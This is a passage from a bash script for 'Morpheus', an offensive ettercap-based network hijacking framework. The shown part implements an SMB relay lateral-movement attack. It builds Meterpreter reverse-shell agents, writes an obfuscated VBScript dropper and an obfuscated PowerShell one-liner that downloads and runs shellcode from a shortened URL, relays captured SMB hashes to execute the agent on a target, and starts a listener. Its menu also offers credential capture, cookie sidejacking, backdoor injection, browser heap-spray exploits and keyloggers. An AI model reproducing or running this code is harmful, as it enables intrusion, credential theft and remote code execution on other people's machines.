  echo ${BlueF}[☠]${white} cleaning settings .. ${Reset};
  sleep 2
  killall sslstrip
  killall python
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  # reset ip-forward
  echo "0" > /proc/sys/net/ipv4/ip_forward
  echo ${BlueF}[☠]${white} editing sslstrip session log File ${Reset};
  sleep 4
  xterm -T "Sslstrip session log" -e "nano $IPATH/output/log.txt"
  sleep 2


else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}







# ----------------------------------------------------
# C&C SMBrelay attack (c&c smb exploit)
# ----------------------------------------------------
sh_stage21 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}In morpheus SMB Relay lateral movement attack we will need 2 pcs  ${BlueF}|"
echo "${BlueF}    | ${YellowF}(attacker,target) the attacker machine will wait for any smb auth ${BlueF}|"
echo "${BlueF}    | ${YellowF}attempts in local lan and uses the hashs captured to authenticate ${BlueF}|"
echo "${BlueF}    | ${YellowF}itself on target machine to upload and execute remote our agent.  ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2



# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

#
# config module settings ..
#
echo ${BlueF}[☠]${white} Enter module settings!${Reset};
sleep 2
lhost=$(zenity --title="☠ Enter  payload LHOST ☠" --text "example: $IP" --entry --width 270)
lport=$(zenity --title="☠ Enter  payload LPORT ☠" --text "example: 666" --entry --width 270)


# select RHOST ..
scnt=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "Scan LAN for active shares" FALSE "Input target ip address [RHOST]" --width 320 --height 200)

if [ "$scnt" = "Scan LAN for active shares" ];then
  dtr=`date | awk {'print $4'}`
  ip_range=`ip route | grep "kernel" | awk {'print $1'}`
  nmap -sS -Pn -T4 -f --script smb-enum-shares.nse,smb-os-discovery.nse -p 445 $IP_RANGE -oN $IPATH/logs/SMBrelay.report | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan for shares" --percentage=0 --auto-close --width 300
  cat $IPATH/logs/SMBrelay.report | grep -v "RTTVAR" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470
  rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270)
  shr=$(zenity --title="☠ Sellect $rhost share ☠" --text "example: ADMIN$ or C$ or IPC$" --entry --width 270)
else
  rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270)
  shr=$(zenity --title="☠ Sellect $rhost share ☠" --text "example: ADMIN$ or C$ or IPC$" --entry --width 270)
fi


  #
  # start metasploit services
  #
  echo ${BlueF}[☠]${white} Start metasploit services ..${Reset};
  service postgresql start
    if [ "$RbUdB" = "YES" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white} Rebuild msfdb [database] ..${Reset};
      msfdb delete
      msfdb init
    fi


  #
  # check dependencies ..
  #
  echo ${BlueF}[☠]${white} Check module dependencies ..${Reset};
  sleep 2
  if [ -d /opt/impacket ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Python impacket libs found ..${Reset};
    sleep 2
  else
    echo ${BlueF}[${RedF}x${BlueF}]${white} Python impacket libs not found ..${Reset};
    sleep 2
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Installing impacket python libs ..${Reset};
    echo ""
    cd /opt
    git clone https://github.com/CoreSecurity/impacket.git
    cd impacket 
    pip install ldap3
    python setup.py install
    echo ""
  fi


#
# build payload (.exe|.vbs) and trigger.bat
#
form=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "\nAvailable agents:" --radiolist --column "Pick" --column "Option" TRUE "Build binary.exe agent" FALSE "Build VBScript agent" FALSE "Build powershell agent" --width 320 --height 230)
if [ "$form" = "Build binary.exe agent" ]; then
  echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
  sleep 2
  xterm -T "MORPHEUS - BUILD AGENT.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
elif [ "$form" = "Build VBScript agent" ]; then
  echo ${BlueF}[☠]${white} Building rc4 agent.vbs ..${Reset};
  sleep 2
  xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
  disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wIN\"+\"eN\"+\"PoWeR\"+\"1\"+\"noP\"+\"ShElL\"+\"noNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" \$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
else
  echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
  sleep 2
oneliner="PoWeRsHelL /W\`in 1 /n\`oP /Com\`mand \"0i=(\"{reve'+'rse_ht'+'tp}{wind'+'ows/}{met'+'erpr'+'eter/}\" -f'1','2','0');I\`EX ('({0}w-Obj\`ect {0}t.WebC\`lient).{1}Str\`ing(\"{2}bit'+'.ly/14b'+'ZZ'+'0c\")' -f'Ne','Down'+'load','htt'+'p://');In\`voke-Sh\`ell\`cod\`e –P\`ay\`loa\`d \$0i –Lh\`ost $lhost –Lp\`ort $lport –F\`or\`ce\""

# default ..
# oneliner="powershell.exe -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force\""
fi



# Simulate the scanner attempting to connect to the share ..
# STRING: dir \\192.168.1.253\ADMIN$
echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
sleep 2
cd $IPATH/bin
sed "s|RePlAcE|$rhost|g" trigger.bat > done.bat
sed -i "s|ShAr3|$shr|g" done.bat
mv done.bat $IPATH/output/trigger.bat


#
# final notes ..
#
if [ "$form" = "Build binary.exe agent" ]; then
zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.exe into target PC [ RHOST ]" --info --width 360 --height 270
elif [ "$form" = "Build VBScript agent" ]; then
zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.vbs into target PC [ RHOST ]" --info --width 360 --height 270
else
zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.ps1 into target PC [ RHOST ]" --info --width 360 --height 270
fi


#
# smbrelay attack
#
cd $IPATH/bin/Utils
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Runing SMBRelay lateral movement ..${Reset};
if [ "$form" = "Build binary.exe agent" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'"
elif [ "$form" = "Build VBScript agent" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.vbs & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'"
else
echo ${BlueF}[☠]${white} Agent:${BlueF} $oneliner ${Reset};
sleep 2
echo ""
python smbrelayx.py -h $rhost -c "$oneliner" & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'"
fi
echo ""


#
# clean
#
echo ${BlueF}[☠]${white} cleaning old files .. ${Reset};
sleep 2
service postgresql stop
cd $IPATH/output/
killall python
rm trigger.bat
rm chars.raw



#
# abort button pressed ..
#
else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}







# ------------------------------------------------
# NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
# ------------------------------------------------
sh_stageS () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Available nmap pre-defined scans:                             ${BlueF}|"
echo "${BlueF}    | ${YellowF}    1º - Normal   -  nmap ip discovery                            ${BlueF}|"
echo "${BlueF}    | ${YellowF}    2º - Stealth  -  nmap syn/ack + OS detection                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}    3º - NSE      -  nmap service detection + nse-vuln categorie  ${BlueF}|"
echo "${BlueF}    | ${YellowF}    4º - Target   -  nmap sealth + nse-vuln categorie             ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 320)
if [ "$?" -eq "0" ]; then


#
# Fake User_Agent funtion
#
if [ "$IPH_UA" = "YES" ]; then
    echo ${BlueF}[☠] Please wait, Replacing http.lua nmap lib ..${Reset};
    sleep 2
      # check if we are in the rigth path
      if [ -e $LUA_PATH/nselib/http.lua ]; then
        cp $LUA_PATH/nselib/http.lua $IPATH/output/http.lua
        cp $IPATH/bin/http.lua $LUA_PATH/nselib/http.lua
        nmap --script-updatedb
      else
        echo ${RedF}[x]${white} http.lua NOT found under sellected path ..${Reset};
        echo ${RedF}[x]${white} edit [ settings ] and config [ LIB_PATH= ] ${Reset};
        sleep 1
        exit
      fi
fi

  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
  # grab ip range + scan with nmap + zenity display results
  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} Ip Range${RedF}:${GreenF}$IP_RANGE ${Reset};

  #
  # agressive scan using nmap -sS -O (OS) pentesting tutorials idea ..
  #
  Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose the type of scan required\nRemmenber that 'stealth scans' takes longer to complete .." --radiolist --column "Pick" --column "Option" TRUE "Normal" FALSE "Stealth" FALSE "NSE" FALSE "Target" --width 300 --height 250)


  #
  # scan local lan using nmap
  #
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} Scan sellected${RedF}:${GreenF}$Tc ${Reset};
  dtr=`date | awk {'print $4'}`
  sleep 1
  #
  # Fake User_Agent funtion
  #
  if [ "$IPH_UA" = "YES" ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Faking User_Agent${RedF}:${GreenF}IPhone${Reset};
  fi


  if [ "$Tc" = "Normal" ]; then
    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 480 --height 390

  elif [ "$Tc" = "Stealth" ]; then
    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "#" | grep -v "CPE:"| grep -v "type:" | grep -v "Distance:" | grep -v "closed" | grep -v "Too" | grep -v "No" | grep -v "latency" | grep -v "incorrect" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470

  elif [ "$Tc" = "NSE" ]; then
    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470

  else

    target=$(zenity --title="☠ Enter  RHOST ☠" --text "example: $IP" --entry --width 270)
    nmap -sS -Pn --reason -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470
  fi


    # cleanup
    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
    rm $IPATH/logs/lan.mop
    sleep 2
    if [ "$IPH_UA" = "YES" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white} Reverting nmap http.lua lib ..${Reset};
      sleep 2
      mv $IPATH/output/http.lua $LUA_PATH/nselib/http.lua
      nmap --script-updatedb
    fi


else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# -------------------------
# FUNTION TO EXIT FRAMEWORK
# -------------------------
sh_exit () {
echo ${BlueF}[☠]${white} Exit morpheus framework...${Reset};
sleep 1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
mv /tmp/etter.conf $Econ
sleep 1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
mv /tmp/etter.dns $Edns
sleep 1
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
rm $ApachE/index.html
sleep 2
clear
echo ${RedF}codename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
echo ${RedF}Morpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2018  ${Reset};
exit
}



sh_main () {
echo "nothing"
}


Colors;
# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
cat << !
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
sleep 1
echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
cat << !
    ╔───────────────────────────────────────────────────────────────────╗
    |   1    -  Firewall filter  (tcp/udp)      -  report/capture_creds |
    |   2    -  Capture cookies  (http/auth)    -  sidejacking attack   |
    |   3    -  Drop all packets (src/dst)      -  packets drop/kill    |
    |   4    -  Redirect browser traffic        -  to another domain    |
    |   5    -  Redirect browser traffic        -  to google sphere     |
    |   6    -  Sniff browser traffic (http)    -  visited url's        |
    |   7    -  Sniff browser traffic (http)    -  capture pictures     |
    |   8    -  Sniff chat messages   (live)    -  AOL,IRC,YAHOO,MSN    |
    |   9    -  Inject backdoor into (</body>)  -  exe,bat,jar,ps1,dll  |
    |  10    -  Firefox browser heap-spray      -  buffer overflow      |
    |  11    -  Android browser heap-spray      -  buffer overflow      |
    |  12    -  Tor-browser heap-spray(windows) -  buffer overflow      |
    |  13    -  Clone website + keylooger       -  javascritp_keylooger |
    |  14    -  Modem/router login webpage      -  javascritp_keylooger |
    |  15    -  Replace website images          -  img src=http://other |
    |  16    -  Replace website text            -  replace: worlds      |
    |  17    -  Devices DHCP discovery          -  devices modem auth   |
    |  18    -  Block cpu crypto-minning        -  drop/kill packets    |
    |  19    -  Redirect browser traffic        -  to google pranks     |
    |  20    -  Capture https credentials       -  sslstrip+dns2proxy   |
    |  21    -  SMBrelay lateral movement       -  C&C SMBRelay exploit |
    |                                                                   |
    |   W    -  Write your own filter                                   |
    |   S    -  Scan LAN for live hosts                                 |
    |   E    -  Exit/close Morpheus                                     |
    ╚───────────────────────────────────────────────────────────────────╣
!
echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2018${BlueF}_⌋${Reset}"
echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
sleep 0.8
echo ${BlueF}[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
echo -n "$PrompT"
read choice
case $choice in
1) sh_stage1 ;;
2) sh_stage2 ;;
3) sh_stage3 ;;
4) sh_stage4 ;;
5) sh_stage5 ;;
6) sh_stage6 ;;
7) sh_stage7 ;;
8) sh_stage8 ;;
9) sh_stage9 ;;
10) sh_stage10 ;;
11) sh_stage11 ;;
12) sh_stage12 ;;
13) sh_stage13 ;;
14) sh_stage14 ;;
15) sh_stage15 ;;
16) sh_stage16 ;;
17) sh_stage17 ;;
18) sh_stage18 ;;
19) sh_stage19 ;;
20) sh_stage20 ;;
21) sh_stage21 ;;
W) sh_stageW ;;
w) sh_stageW ;;
S) sh_stageS ;;
s) sh_stageS ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": is not a valid Option"; sleep 1.3 ;;
esac
done


